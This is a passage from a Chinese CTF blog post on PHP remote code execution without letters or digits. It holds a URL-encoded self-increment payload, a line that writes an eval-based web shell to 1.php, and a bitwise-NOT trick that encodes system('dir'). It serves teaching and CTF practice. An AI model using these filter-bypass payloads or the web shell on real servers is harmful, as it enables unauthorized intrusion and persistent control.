class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$___($_[_]);&amp;_=file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;)</span></span><br><span class="line"><span class="comment">// code=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D&#x27;_&#x27;%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B</span></span><br><span class="line">&amp;_=<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="其他1"><a href="#其他1" class="headerlink" title="其他1"></a>其他1</h4><p>在自增中，可以通过特殊字符构造出字符串的有以下几种方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[].&#x27;&#x27;  //Array</span><br><span class="line">(0/0).&#x27;&#x27;   //NAN</span><br><span class="line">(1/0).&#x27;&#x27;   //INF</span><br></pre></td></tr></table></figure>
+
+<p>这个时候就有一个问题了，如果ban了数字，我们该怎么去构造<code>NAN</code>和<code>INF</code>呢，这个时候就需要讲到一个知识点，我们这里的话需要说一下这个<code>NAN</code>和<code>INF</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。</span><br><span class="line"></span><br><span class="line">INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看出<code>NAN</code>表示的是未被定义的值，所以我们这里可以通过<code>a/a</code>这种方式构造，如果字母也被ban，我们也可以借助其他字符，比如<code>_/_</code>，这个时候也可以得到<code>NAN</code>，同理，<code>INF</code>也可以通过<code>1/a</code>的方式获取。</p>
+<h4 id="其他2"><a href="#其他2" class="headerlink" title="其他2"></a>其他2</h4><p>我们在构造<code>$_POST</code>中的<code>_</code>时，正常操作的话是这样，<code>$a=&#39;_&#39;.$b(假设这里$b就是POST)</code>，然后这个时候如果<code>&#39;</code>被ban，看似这里是无法再利用了，但其实，我们直接写<code>$a=_.$b</code>也是可以的，这个时候效果同上而且缩短了字符长度。</p>
+<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ans1</span>=<span class="string">&#x27;system&#x27;</span>;<span class="comment">//函数名</span></span><br><span class="line"><span class="variable">$ans2</span>=<span class="string">&#x27;dir&#x27;</span>;<span class="comment">//命令</span></span><br><span class="line"><span class="variable">$data1</span>=(<span class="string">&#x27;~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$ans1</span>));<span class="comment">//通过两次取反运算得到system</span></span><br><span class="line"><span class="variable">$data2</span>=(<span class="string">&#x27;~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$ans2</span>));<span class="comment">//通过两次取反运算得到dir</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data1</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data2</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="comment">// (~%8c%86%8c%8b%9a%92)(~%9b%96%8d)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/09/24/CTFSHOW-shellmeRevenge-wp/">CTFSHOW吃瓜杯-shellmeRevenge-wp</a></p>
+<p>CTFSHOW RCE挑战1-5  <a target="_blank" rel="noopener" href="https://ctf.show/challenges#RCE%E6%8C%91%E6%88%981-3916">https://ctf.show/challenges#RCE挑战1-3916</a>   &#x2F;  2-3917  &#x2F; 3-3918 ….</p>
+<blockquote>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11929">https://xz.aliyun.com/t/11929</a></p>
+</blockquote>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2023/09/24/rce-noalpha/" class="leancloud-visitors view" data-flag-title="无字母RCE">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/09/28/CTFSHOW-extremeRCE-wp/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/09/21/wdb2018-blind-wp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-09-24 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/web-learning/">web-learning<span>4</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>73</span></a></li> <li><a href="/tags/web/">web<span>45</span></a></li> <li><a href="/tags/rce/">rce<span>13</span></a></li> <li><a href="/tags/无字母rce/">无字母rce<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
